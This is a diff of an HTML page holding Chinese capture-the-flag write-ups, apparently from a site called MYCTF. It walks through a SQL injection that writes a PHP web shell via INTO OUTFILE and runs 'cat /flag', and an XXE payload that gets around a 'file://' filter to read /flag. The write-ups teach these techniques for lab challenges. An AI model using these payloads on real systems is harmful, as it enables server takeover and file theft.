+<div class="language-sql highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
 </span></code></pre></div>
 <p><strong>几个必须注意的地方：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>① 路径用 @@secure_file_priv 给的那个，不能写别处
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
-</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
-</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
-</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>④ 所以用 $_GET[0] 这种不带引号的写法最保险
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>① 路径用 @@secure_file_priv 给的那个，不能写别处
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>④ 所以用 $_GET[0] 这种不带引号的写法最保险
 </span></code></pre></div>
 <p><strong>访问：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>/io/C.php?0=cat%20/flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>/io/C.php?0=cat%20/flag
 </span></code></pre></div>
 <p><strong>得到：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
 </span></code></pre></div>
 <hr />
 <table>
@@ -3744,19 +3926,19 @@
 <hr />
 <details class="note">
 <summary>完整流程</summary>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1">-- ① 确认列数</span>
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1">-- ② 爆表</span>
-</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
-</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
-</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="c1">-- ③ 看写权限目录</span>
-</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
-</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>
-</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="c1">-- ④ 写 shell</span>
-</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1">-- ① 确认列数</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c1">-- ② 爆表</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="c1">-- ③ 看写权限目录</span>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>
+</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="c1">-- ④ 写 shell</span>
+</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>访问：/io/C.php?0=cat /flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>访问：/io/C.php?0=cat /flag
 </span></code></pre></div>
 </details>
 <details class="note">
@@ -4193,9 +4375,9 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../myctf-xxe-shi-jian/#_1">题目概述</a></h3>
 <p>题目背景写得很讲究：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
 </span></code></pre></div>
 <p><strong>“笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会</strong>原样解析并回显<strong>你提交的 XML。</strong></p>
 <p><strong>而那面小旗（flag）就在它案头，也就是 <code>/flag</code> 文件。</strong></p>
@@ -4204,64 +4386,64 @@
 <h3 id="_2"><a class="toclink" href="../../myctf-xxe-shi-jian/#_2">解题过程</a></h3>
 <h4 id="step-1-js"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-1-js">Step 1：先看 JS，找到提交入口</a></h4>
 <p><strong>页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：</strong></p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
-</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
-</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span><span class="p">})</span>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="w">  </span><span class="p">})</span>
 </span></code></pre></div>
 <p><strong>三件事一眼看清：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>接口      POST /tengchao
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>类型      application/xml
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>请求体    输入框 #x 里的全部内容，原样提交
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>接口      POST /tengchao
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>类型      application/xml
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>请求体    输入框 #x 里的全部内容，原样提交
 </span></code></pre></div>
 <p><strong>也就是说：输入框里写什么 XML，服务器就拿什么去解析。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-2">Step 2：先确认后端语言（这一步很重要）</a></h4>
 <p><strong>我第一反应是 PHP 环境，于是去试 <code>php://filter</code>。</strong></p>
 <p><strong>结果报错里的堆栈信息显示是</strong>Java<strong>。</strong></p>
 <p><strong>这一步的价值：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>报错暴露语言 → 决定用哪套绕过思路
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>PHP  的伪协议        php://filter、php://input
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>报错暴露语言 → 决定用哪套绕过思路
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>PHP  的伪协议        php://filter、php://input
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
 </span></code></pre></div>
 <p><strong>很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于</strong>解析器是谁<strong>。</strong></p>
 <h4 id="step-3file-java"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-3file-java">Step 3：<code>file://</code> 被过滤，但 Java 不认这个死理</a></h4>
 <p><strong>直接写 <code>file:///flag</code>，被拦了——代码里过滤了 <code>file://</code> 这个字符串。</strong></p>
 <p><strong>但 Java 的 XML 解析器在解析 <code>SYSTEM</code> 后面的值时，是按 <strong>URI</strong> 处理的，对斜杠数量并不敏感：</strong></p>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
 </span></code></pre></div>
 <p><strong>所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。</strong>它以为外部实体只有 <code>file://</code> 一种形态。</p>
 <h4 id="step-4-payload"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-4-payload">Step 4：写 payload</a></h4>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nt">&lt;诗筏&gt;</span>
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
-</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="nt">&lt;/诗筏&gt;</span>
 </span></code></pre></div>
 <p><strong>三部分缺一不可：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
-</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>③ 保留原有的结构
-</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>③ 保留原有的结构
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
 </span></code></pre></div>
 <p><strong>最容易漏的是第 ②：</strong>只声明实体、不引用，服务器什么都不会给你。**</p>
 <h4 id="step-5"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-5">Step 5：提交，读结果</a></h4>
 <p><strong>把整段 XML 填进输入框，点提交。</strong></p>
 <p><strong>“誊抄入册”那块原样回显了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>落款：
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>出浴太真冰作影
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>捧心西子玉为魂
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>落款：
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>出浴太真冰作影
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>捧心西子玉为魂
 </span></code></pre></div>
 <p><strong>因为 <code>&amp;x;</code> 在解析时被替换成了 <code>/flag</code> 文件的内容。</strong></p>
 <hr />
@@ -4302,14 +4484,14 @@
 <hr />
 <details class="note">
 <summary>完整 payload</summary>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="nt">&lt;诗筏&gt;</span>
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
-</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
